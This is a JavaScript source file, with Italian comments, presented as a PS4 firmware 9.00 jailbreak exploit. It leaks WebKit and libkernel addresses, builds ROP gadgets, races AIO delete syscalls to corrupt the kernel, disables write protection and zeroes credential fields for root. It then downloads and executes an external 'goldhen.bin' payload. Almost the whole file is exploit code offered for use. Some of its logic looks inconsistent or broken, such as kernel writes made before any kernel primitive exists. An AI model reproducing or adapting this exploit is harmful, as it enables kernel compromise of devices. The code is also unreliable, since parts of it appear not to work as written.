///////////////////////////////
// PS4 9.00 Exploit Chain AIO
// Sostituisce completamente USB exFAT
///////////////////////////////

const OFFSET_wk_vtable_first_element = 0x104F110;
const OFFSET_WK_memset_import = 0x000002A8;
const OFFSET_WK___stack_chk_fail_import = 0x00000178;
const OFFSET_WK_psl_builtin_import = 0xD68;
const OFFSET_WKR_psl_builtin = 0x33BA0;
const OFFSET_libcint_memset = 0x0004F810;
const OFFSET_lk___stack_chk_fail = 0x0001FF60;
const SYSCALL_AIO_SUBMIT = 323;
const SYSCALL_AIO_WAIT = 324;
const SYSCALL_AIO_DELETE = 325;

var chain, kchain, kchain2;
var SAVED_KERNEL_STACK_PTR, KERNEL_BASE_PTR;
var webKitBase, webKitRequirementBase, libSceLibcInternalBase, libKernelBase;
var textArea = document.createElement("textarea");
var nogc = [];
var syscalls = {};
var gadgets = {};

// Gadgets AIO-optimized
var wk_gadgetmap = {
    "ret": 0x32,
    "pop rdi": 0x319690,
    "mov [rdi], rsi": 0x1A97920,
    "cli ; pop rax": 0x566F8,
    "sti": 0x1FBBCC,
    "mov rsp, rdi": 0x2048062
};

function kernelExploit() {
    const AIO_REQS = 3;
    const RACE_ATTEMPTS = 100;
    const KERNEL_CRED_OFFSET = -0x68;
    const KERNEL_SETCR0_OFFSET = 0x3ADE3B;

    class AioRequest {
        constructor() {
            this.fd = -1;
            this.offset = 0;
            this.nbyte = 0x1000;
            this.buf = p.malloc(0x1000);
            this.result = p.malloc(0x20);
        }
    }

    function setupAioRequests() {
        let reqs = [];
        for(let i = 0; i < AIO_REQS; i++) {
            let req = new AioRequest();
            chain.fcall(syscalls[203], req.buf, 0x1000);
            chain.fcall(syscalls[203], req.result, 0x20);
            reqs.push(req);
        }
        return reqs;
    }

    function triggerRaceCondition(ids) {
        let raceErrors = new Int32Array(2);
        let targetId = new Int32Array([ids[0]]);
        
        chain.fcall(syscalls[SYSCALL_AIO_DELETE], 
            p.leakval(targetId), 1, p.leakval(raceErrors.subarray(1)));
        
        chain.fcall(syscalls[SYSCALL_AIO_DELETE],
            p.leakval(targetId), 1, p.leakval(raceErrors.subarray(0)));

        return raceErrors;
    }

    function escalatePrivileges() {
        let credAddr = chain.syscall(23, 0).add32(KERNEL_CRED_OFFSET);
        chain.kwrite8(credAddr.add32(0x04), 0x0);
        chain.kwrite8(credAddr.add32(0x0C), 0x0);
    }

    for(let attempt = 0; attempt < RACE_ATTEMPTS; attempt++) {
        let reqs = setupAioRequests();
        let ids = new Int32Array(AIO_REQS);
        let errors = new Int32Array(AIO_REQS);

        chain.fcall(syscalls[SYSCALL_AIO_SUBMIT],
            0x002 | 0x1000,
            p.stringifyStructArray(reqs),
            AIO_REQS,
            3,
            p.leakval(ids)
        );

        chain.fcall(syscalls[SYSCALL_AIO_WAIT],
            p.leakval(ids),
            AIO_REQS,
            p.leakval(errors),
            0x1,
            0
        );

        let raceErrors = triggerRaceCondition(ids);
        chain.run();

        if(p.read4(raceErrors) === p.read4(raceErrors.add32(4))) {
            let fakeObj = p.malloc(0x100);
            p.write8(fakeObj, gadgets["mov rsp, rdi"]);
            
            chain.kwrite8(KERNEL_BASE_PTR.add32(KERNEL_SETCR0_OFFSET), 
                new int64(0x80050033, 0xFFFFFFFF));

            escalatePrivileges();
            loadPayload();
            return;
        }
    }
    alert("Exploit AIO Fallito!");
}

function userland() {
    p.launch_chain = launch_chain;
    p.malloc = malloc;
    p.malloc32 = malloc32;
    p.stringify = stringify;
    p.array_from_address = array_from_address;
    p.readstr = readstr;

    var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    var textAreaVtable = p.read8(textAreaVtPtr);
    webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
    
    libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
    libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);
    
    libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

    syscalls = {
        203: libKernelBase.add32(0x1A0),
        323: libKernelBase.add32(0x2D8),
        324: libKernelBase.add32(0x2E0),
        325: libKernelBase.add32(0x2E8)
    };

    for (var gadget in wk_gadgetmap) {
        gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
    }
}

function run_hax() {
    userland();
    
    if (chain.syscall(23, 0).low != 0x0) {
        localStorage.HenLoaded = "no";
        kernelExploit();
    }
    
    if (chain.syscall(23, 0).low == 0) {
        localStorage.HenLoaded === "yes" ? runBinLoader() : loadPayload();
    }
}

// Helper functions
function get_jmptgt(address) {
    var instr = p.read4(address) & 0xFFFF;
    var offset = p.read4(address.add32(2));
    return instr === 0x25FF ? address.add32(0x6 + offset) : 0;
}

function loadPayload() {
    var req = new XMLHttpRequest();
    req.responseType = "arraybuffer";
    req.open('GET','goldhen.bin',true);
    req.send();
    
    req.onload = function() {
        var payload = new Uint8Array(req.response);
        var payloadBuffer = chain.syscall(477, 0, payload.length, 0x7, 0x1000, -1, 0);
        p.array_from_address(payloadBuffer, payload.length).set(payload);
        chain.fcall(libKernelBase.add32(0x25510), p.malloc(0x10), 0, payloadBuffer);
        chain.run();
    };
}


